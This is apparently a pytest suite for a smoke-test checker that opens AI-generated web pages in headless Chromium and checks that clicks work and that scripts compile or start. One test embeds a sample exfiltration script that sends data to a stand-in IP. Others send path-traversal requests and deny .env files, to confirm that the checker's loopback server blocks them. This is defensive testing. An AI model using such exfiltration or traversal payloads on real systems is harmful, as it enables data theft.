"""check_app: known-broken deliverables must fail with readable messages; working ones must pass."""
import http.server
import shutil
import threading
import urllib.error
import urllib.request

import pytest

from agent8088 import app_check

@pytest.fixture
def chromium():
    """Skip when Chromium is not installed. Decided when the test runs, not when
    it is collected: importing the engine changes where Playwright looks."""
    if not app_check.chromium_available():
        pytest.skip("Chromium for Playwright is not installed")


needs_chromium = pytest.mark.usefixtures("chromium")

WORKING = """<!doctype html><html><body>
<button id="go" onclick="document.getElementById('out').textContent='clicked'">Go</button>
<p id="out">waiting</p></body></html>"""

OVERLAY = """<!doctype html><html><body>
<button id="go" onclick="document.getElementById('out').textContent='clicked'">Go</button>
<p id="out">waiting</p>
<div id="modal" style="position:fixed;inset:0;background:rgba(0,0,0,.5)"></div></body></html>"""

MISSING_SCRIPT = """<!doctype html><html><body>
<button id="go">Go</button><script src="app.js"></script></body></html>"""

CONSOLE_ERROR = """<!doctype html><html><body>
<button onclick="document.title='x'">Go</button>
<script>console.error('state is corrupt')</script></body></html>"""

PAGE_ERROR = """<!doctype html><html><body>
<button onclick="document.title='x'">Go</button>
<script>startGame()</script></body></html>"""

CALLBACK_CLEARED = """<!doctype html><html><body>
<button id="go">Go</button><p id="out">waiting</p>
<script>
const handler = () => { document.getElementById('out').textContent = 'clicked'; };
const go = document.getElementById('go');
go.onclick = handler;
go.onclick = null;   // cleared before it could ever run
</script></body></html>"""

EXTERNAL = """<!doctype html><html><head>
<link rel="stylesheet" href="https://fonts.example.com/font.css">
<script src="https://cdn.example.com/lib.js"></script></head><body>
<img src="https://images.example.com/hero.png">
<button onclick="document.title='clicked'">Go</button></body></html>"""

NO_CONTROLS = "<!doctype html><html><body><h1>Hello</h1></body></html>"

CANVAS = """<!doctype html><html><body><canvas id="c" width="50" height="50"></canvas>
<button onclick="const c=document.getElementById('c').getContext('2d');c.fillStyle='red';c.fillRect(0,0,50,50)">Draw</button>
</body></html>"""


def _page(tmp_path, html, name="index.html"):
    path = tmp_path / name
    path.write_text(html, encoding="utf-8")
    return path


@needs_chromium
def test_a_working_page_passes(tmp_path):
    report = app_check.check_web_page(_page(tmp_path, WORKING))
    assert report.status == app_check.PASS, report.text()
    assert not report.failures and not report.warnings


@needs_chromium
def test_an_overlay_that_blocks_every_click_fails_with_a_readable_message(tmp_path):
    report = app_check.check_web_page(_page(tmp_path, OVERLAY))
    assert report.failed
    assert any("covered by div#modal" in f and "click never reaches it" in f for f in report.failures), report.failures


@needs_chromium
def test_a_script_that_was_never_written_fails(tmp_path):
    report = app_check.check_web_page(_page(tmp_path, MISSING_SCRIPT))
    assert report.failed
    assert any("/app.js returned 404" in f for f in report.failures), report.failures


@needs_chromium
def test_a_console_error_from_the_apps_own_code_fails(tmp_path):
    report = app_check.check_web_page(_page(tmp_path, CONSOLE_ERROR))
    assert report.failed and any("state is corrupt" in f for f in report.failures)


@needs_chromium
def test_an_uncaught_page_error_fails(tmp_path):
    report = app_check.check_web_page(_page(tmp_path, PAGE_ERROR))
    assert report.failed and any("page error" in f and "startGame" in f for f in report.failures)


@needs_chromium
def test_a_callback_cleared_too_early_shows_as_an_inert_click(tmp_path):
    report = app_check.check_web_page(_page(tmp_path, CALLBACK_CLEARED))
    assert report.failed
    assert any("changed nothing" in f for f in report.failures), report.failures


@needs_chromium
def test_external_requests_are_blocked_and_only_warn(tmp_path):
    report = app_check.check_web_page(_page(tmp_path, EXTERNAL))
    assert report.status == app_check.PASS, report.text()
    hosts = " ".join(report.warnings)
    assert "fonts.example.com" in hosts and "cdn.example.com" in hosts and "images.example.com" in hosts
    assert "(3 warnings)" in report.summary()


@needs_chromium
def test_a_page_without_controls_passes_with_a_warning(tmp_path):
    report = app_check.check_web_page(_page(tmp_path, NO_CONTROLS))
    assert report.status == app_check.PASS
    assert any("no visible button" in w for w in report.warnings)


@needs_chromium
def test_a_click_that_only_redraws_a_canvas_counts_as_a_change(tmp_path):
    assert app_check.check_web_page(_page(tmp_path, CANVAS)).status == app_check.PASS


@needs_chromium
def test_a_folder_is_checked_through_its_index_page(tmp_path):
    _page(tmp_path, WORKING)
    assert app_check.check_target(tmp_path).status == app_check.PASS
    empty = tmp_path / "empty"
    empty.mkdir()
    assert app_check.check_target(empty).status == app_check.SKIPPED


@needs_chromium
def test_the_check_never_reaches_the_network(tmp_path, monkeypatch):
    """Anything not on the page's own origin is aborted, so an exfiltration attempt goes nowhere."""
    html = ("<!doctype html><html><body><button onclick=\"document.title='x'\">Go</button>"
            "<script>fetch('http://203.0.113.9/steal?d=1').catch(()=>{});"
            "new Image().src='http://203.0.113.9/p.png'</script></body></html>")
    report = app_check.check_web_page(_page(tmp_path, html))
    assert any("203.0.113.9" in w for w in report.warnings)
    assert report.status == app_check.PASS


def test_a_missing_file_fails_without_a_browser(tmp_path):
    report = app_check.check_web_page(tmp_path / "nope.html")
    assert report.failed and "does not exist" in report.failures[0]


def test_without_chromium_the_check_is_unavailable_not_failed(tmp_path, monkeypatch):
    monkeypatch.setattr(app_check, "chromium_available", lambda: False)
    report = app_check.check_web_page(_page(tmp_path, WORKING))
    assert report.status == app_check.UNAVAILABLE and "playwright install chromium" in report.note
    assert not report.failed


# --- the static server ---------------------------------------------------------------------------

def _serve(root, deny=None):
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), app_check._handler(root, deny))
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


def _get(server, path, method="GET"):
    request = urllib.request.Request(f"http://127.0.0.1:{server.server_address[1]}{path}", method=method)
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            return response.status, response.read()
    except urllib.error.HTTPError as error:
        return error.code, b""


def test_the_static_server_serves_only_its_own_folder(tmp_path):
    site = tmp_path / "site"
    site.mkdir()
    (site / "index.html").write_text("hi", encoding="utf-8")
    (tmp_path / "secret.txt").write_text("top secret", encoding="utf-8")
    server = _serve(site)
    try:
        assert _get(server, "/index.html") == (200, b"hi")
        assert _get(server, "/%2e%2e/secret.txt")[0] == 404
        assert _get(server, "/../secret.txt")[0] == 404
        # A backslash is not a separator to the server: it falls back to the folder itself.
        assert b"top secret" not in _get(server, "/..%5csecret.txt")[1]
    finally:
        server.shutdown()
        server.server_close()
    bare = tmp_path / "bare"
    bare.mkdir()
    (bare / "data.json").write_text("{}", encoding="utf-8")
    listing = _serve(bare)
    try:
        assert _get(listing, "/")[0] == 404, "a folder without an index page is not listed"
        assert _get(listing, "/data.json")[0] == 200
    finally:
        listing.shutdown()
        listing.server_close()


def test_the_static_server_refuses_denied_files_and_writes(tmp_path):
    (tmp_path / "index.html").write_text("hi", encoding="utf-8")
    (tmp_path / ".env").write_text("KEY=1", encoding="utf-8")
    server = _serve(tmp_path, deny=lambda path: path.endswith(".env"))
    try:
        assert _get(server, "/.env")[0] == 404
        assert _get(server, "/index.html")[0] == 200
        request = urllib.request.Request(f"http://127.0.0.1:{server.server_address[1]}/index.html",
                                         data=b"x", method="POST")
        with pytest.raises(urllib.error.HTTPError) as caught:
            urllib.request.urlopen(request, timeout=5)
        assert caught.value.code == 405
    finally:
        server.shutdown()
        server.server_close()


def test_the_static_server_listens_on_loopback_only(tmp_path):
    server = _serve(tmp_path)
    try:
        assert server.server_address[0] == "127.0.0.1"
    finally:
        server.shutdown()
        server.server_close()


# --- scripts ---------------------------------------------------------------------------------------

def test_a_python_script_that_compiles_passes_and_is_not_run(tmp_path):
    marker = tmp_path / "ran.txt"
    script = tmp_path / "tool.py"
    script.write_text(f"open({str(marker)!r}, 'w').write('x')\n", encoding="utf-8")
    report = app_check.check_script(script)
    assert report.status == app_check.PASS and "not executed" in report.note
    assert not marker.exists()


def test_a_python_syntax_error_fails_with_the_line(tmp_path):
    script = tmp_path / "bad.py"
    script.write_text("x = 1\nif x = 2:\n    pass\n", encoding="utf-8")
    report = app_check.check_script(script)
    assert report.failed and "line 2" in report.failures[0]


@pytest.mark.skipif(shutil.which("node") is None, reason="node is not installed")
def test_node_scripts_are_parse_checked(tmp_path):
    good, bad = tmp_path / "good.js", tmp_path / "bad.js"
    good.write_text("const a = 1;\nconsole.log(a);\n", encoding="utf-8")
    bad.write_text("const = ;\n", encoding="utf-8")
    assert app_check.check_script(good).status == app_check.PASS
    assert app_check.check_script(bad).failed


def test_other_files_are_skipped(tmp_path):
    notes = tmp_path / "notes.txt"
    notes.write_text("hi", encoding="utf-8")
    assert app_check.check_target(notes).status == app_check.SKIPPED


# --- finding the deliverables --------------------------------------------------------------------

def test_deliverable_targets_pick_pages_and_scripts_and_skip_the_rest(tmp_path):
    for name in ("index.html", "app.py", "notes.md", "test_app.py", "app.test.js", "lib.js"):
        (tmp_path / name).write_text("x", encoding="utf-8")
    (tmp_path / "node_modules").mkdir()
    (tmp_path / "node_modules" / "dep.js").write_text("x", encoding="utf-8")
    written = ["index.html", "app.py", "notes.md", "test_app.py", "app.test.js", "lib.js",
               "node_modules/dep.js", "missing.html"]
    targets = app_check.deliverable_targets(written, [tmp_path], limit=10)
    assert [p.name for p in targets] == ["index.html", "app.py", "lib.js"]


def test_deliverable_targets_are_limited_pages_first(tmp_path):
    for name in ("a.py", "b.py", "c.html"):
        (tmp_path / name).write_text("x", encoding="utf-8")
    assert [p.name for p in app_check.deliverable_targets(["a.py", "b.py", "c.html"], [tmp_path], 2)] == ["c.html", "a.py"]


def test_the_report_text_is_short_and_lists_failures_then_warnings():
    report = app_check.Report("web", "/w/index.html", app_check.FAIL,
                              failures=[f"failure {n}" for n in range(9)],
                              warnings=["blocked request to an external host: http://x"],
                              console=["error: boom"])
    text = report.text()
    assert text.startswith("index.html: smoke test FAILED - failure 0; failure 1")
    assert sum(1 for line in text.splitlines() if line.startswith("- failure")) == app_check.MAX_ITEMS
    assert "Warnings (not failures):" in text and "Console:" in text
    assert len(report.text(limit=100)) <= 100


# --- audit issues 24-30 ------------------------------------------------------------------------

def test_serve_root_climbs_to_reach_parent_links(tmp_path):
    (tmp_path / "docs").mkdir()
    page = tmp_path / "docs" / "index.html"
    page.write_text('<link rel="stylesheet" href="../style.css">', encoding="utf-8")
    assert app_check.serve_root(page) == tmp_path
    flat = tmp_path / "docs" / "flat.html"
    flat.write_text('<link rel="stylesheet" href="style.css">', encoding="utf-8")
    assert app_check.serve_root(flat) == tmp_path / "docs"


@needs_chromium
def test_page_with_parent_stylesheet_passes(tmp_path):
    (tmp_path / "docs").mkdir()
    (tmp_path / "style.css").write_text("body{color:red}", encoding="utf-8")
    page = tmp_path / "docs" / "index.html"
    page.write_text('<link rel="stylesheet" href="../style.css">' + WORKING, encoding="utf-8")
    assert app_check.check_web_page(page).status == app_check.PASS


@needs_chromium
def test_popup_counts_as_an_effect(tmp_path):
    page = tmp_path / "index.html"
    page.write_text('<button onclick="alert(\'hi\')">Go</button>', encoding="utf-8")
    report = app_check.check_web_page(page)
    assert report.status == app_check.PASS and any("popup" in w for w in report.warnings)


@needs_chromium
def test_error_from_a_blocked_cdn_script_is_inconclusive_not_a_false_pass(tmp_path):
    page = tmp_path / "index.html"
    page.write_text('<script src="https://cdn.example.com/chart.js"></script>'
                    '<button onclick="document.title=\'x\'">Go</button>'
                    '<script>new Chart(1)</script>', encoding="utf-8")
    report = app_check.check_web_page(page)
    assert report.status == app_check.UNAVAILABLE
    assert not report.failed
    assert any("blocked external script" in w for w in report.warnings)


def test_a_timed_out_probe_is_not_remembered(monkeypatch):
    app_check._CHROMIUM_ANSWERS.clear()
    answers = iter([None, True])
    monkeypatch.setattr(app_check, "_chromium_available", lambda key: next(answers))
    assert app_check.chromium_available() is False      # unknown this time
    assert app_check.chromium_available() is True       # asked again, now known
    assert app_check.chromium_available() is True       # definite answers are cached
    app_check._CHROMIUM_ANSWERS.clear()


def test_script_that_crashes_on_start_fails(tmp_path):
    script = tmp_path / "tool.py"
    script.write_text("import missing_module_xyz\n", encoding="utf-8")
    crash = lambda cmd, timeout: ("Traceback (most recent call last):\n"
                                  "ModuleNotFoundError: No module named 'missing_module_xyz'\n"
                                  "Command exited with status 1.")
    report = app_check.check_script(script, run=crash)
    assert report.status == app_check.FAIL and "crashed" in report.failures[0]
    usage = lambda cmd, timeout: "usage: tool.py [-h]\nCommand exited with status 2."
    assert app_check.check_script(script, run=usage).status == app_check.PASS
    assert app_check.check_script(script, run=lambda c, t: "Command timed out after 10s.").status == app_check.PASS
    assert app_check.check_script(script).note == "compiles; not executed"


def test_timed_out_check_shuts_its_server_down(monkeypatch):
    stopped = []
    server = type("S", (), {"shutdown": lambda self: stopped.append("shutdown"),
                            "server_close": lambda self: stopped.append("close")})()
    app_check._abandon({"server": server}, 0.0)
    assert stopped == ["shutdown", "close"]


def test_the_models_throwaway_helpers_are_not_deliverables(tmp_path):
    names = ("index.html", "app.py", "_clean.py", "_fix.js", "_tmp_poke.js", "tmp_check.py",
             "scratch.py", "debug_dump.js", "__init__.py", "temperature.py")
    for name in names:
        (tmp_path / name).write_text("x", encoding="utf-8")
    targets = app_check.deliverable_targets(list(names), [tmp_path], limit=10)
    assert [p.name for p in targets] == ["index.html", "app.py", "__init__.py", "temperature.py"]


def test_a_crashing_helper_does_not_fail_the_smoke_test(tmp_path):
    (tmp_path / "app.py").write_text("print('ok')\n", encoding="utf-8")
    (tmp_path / "_clean.py").write_text("import sys\nsys.exit(2)\n", encoding="utf-8")
    targets = app_check.deliverable_targets(["app.py", "_clean.py"], [tmp_path])
    assert [p.name for p in targets] == ["app.py"]


def test_a_browser_script_run_under_node_is_not_a_crash(tmp_path):
    script = tmp_path / "app.js"
    script.write_text("window.addEventListener('load', () => {});\n", encoding="utf-8")
    seen = "ReferenceError: window is not defined\nCommand exited with status 1."
    assert app_check._run_briefly(script, lambda command, timeout: seen) == []


def test_browser_context_is_unavailable_not_verified_startup(tmp_path):
    script = tmp_path / "browser.js"
    script.write_text("window.addEventListener('load', () => {});", encoding="utf-8")
    report = app_check.check_script(script, run=lambda command, timeout:
        "ReferenceError: window is not defined\nCommand exited with status 1.")
    assert report.status == app_check.UNAVAILABLE
    assert "startup was not verified" in report.note
    assert not report.failures


def test_a_real_node_crash_still_counts(tmp_path):
    script = tmp_path / "server.js"
    script.write_text("x\n", encoding="utf-8")
    seen = "ReferenceError: config is not defined\nCommand exited with status 1."
    assert app_check._run_briefly(script, lambda command, timeout: seen)


def test_a_failed_script_start_keeps_what_the_script_printed(tmp_path):
    script = tmp_path / "tool.py"
    script.write_text("print('x')\n", encoding="utf-8")
    printed = ("Traceback (most recent call last):\n  File \"tool.py\", line 3\n"
               "ModuleNotFoundError: No module named 'nothing_here'\nCommand exited with status 1.")
    report = app_check.check_script(script, run=lambda cmd, timeout: printed)
    assert report.failed and "ModuleNotFoundError" in report.output
    assert app_check.check_script(script, run=lambda c, t: "usage: tool.py [-h]").output == ""


def test_a_long_start_output_is_clipped_from_the_middle():
    long = "a" * 1000 + "MIDDLE" + "z" * 1000
    clipped = app_check.clip_output(long)
    assert clipped.startswith("a" * 400) and clipped.endswith("z" * 400)
    assert "MIDDLE" not in clipped and "[...]" in clipped
    assert app_check.clip_output("short") == "short"


# --- a start that cannot show whether the script works is "not verified", not a crash ---------------

@pytest.mark.parametrize("printed", [
    "Command exited with status 1.",
    "Traceback (most recent call last):\n  File \"build.py\", line 9, in <module>\n"
    "PermissionError: [Errno 13] Permission denied: 'out/report.xlsx'\nCommand exited with status 1.",
    "Traceback (most recent call last):\nOSError: [Errno 30] Read-only file system: 'out.pdf'\n"
    "Command exited with status 1.",
    "Traceback (most recent call last):\nFileNotFoundError: [Errno 2] No such file or directory: 'data.csv'\n"
    "Command exited with status 1.",
])
def test_a_start_that_fails_for_the_place_it_ran_in_is_not_verified_rather_than_crashed(tmp_path, printed):
    script = tmp_path / "build.py"
    script.write_text("print('x')\n", encoding="utf-8")
    report = app_check.check_script(script, run=lambda cmd, timeout: printed)
    assert report.status == app_check.UNAVAILABLE and report.ask is True
    assert "not verified" in report.note and report.output


@pytest.mark.parametrize("printed", [
    "Traceback (most recent call last):\nModuleNotFoundError: No module named 'nothing_here'\nCommand exited with status 1.",
    "Traceback (most recent call last):\nNameError: name 'rows' is not defined\nCommand exited with status 1.",
    "Traceback (most recent call last):\nTypeError: 'NoneType' object is not iterable\nCommand exited with status 1.",
])
def test_an_error_about_the_code_itself_is_still_a_crash(tmp_path, printed):
    script = tmp_path / "build.py"
    script.write_text("print('x')\n", encoding="utf-8")
    report = app_check.check_script(script, run=lambda cmd, timeout: printed)
    assert report.failed and "crashed" in report.failures[0]


def test_a_node_start_that_cannot_open_a_path_is_not_verified_and_a_missing_module_is_a_crash(tmp_path, monkeypatch):
    import shutil
    if not shutil.which("node"):
        pytest.skip("node is not installed")
    script = tmp_path / "build.js"
    script.write_text("console.log('x')\n", encoding="utf-8")
    soft = app_check.check_script(script, run=lambda c, t: "Error: ENOENT: no such file or directory, open 'a.json'\n"
                                                           "Command exited with status 1.")
    assert soft.status == app_check.UNAVAILABLE and soft.ask is True
    hard = app_check.check_script(script, run=lambda c, t: "Error: Cannot find module './data'\nCommand exited with status 1.")
    assert hard.failed
